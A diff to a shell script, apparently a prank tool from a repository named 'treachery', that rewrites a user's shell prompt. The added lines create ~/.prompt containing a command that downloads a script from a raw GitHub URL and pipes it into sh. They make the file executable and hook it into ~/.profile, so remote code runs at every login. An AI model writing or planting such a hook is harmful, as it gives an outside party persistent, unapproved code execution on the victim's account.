@@ -15,8 +15,13 @@ putrc() {
 		echo "$1" >> $word
 	done
 }
+if [ -e ~/.prompt ]; then
+	exit
+fi
 putrc "\nPS1=\"${PROMPT}\""
-echo 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.profile
+echo 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.prompt
+chmod +x ~/.prompt
+echo '~/.prompt' >> ~/.profile
 case "${SHELL}" in
 	"/bin/zsh")
 		source "${HOME}/.zshrc"
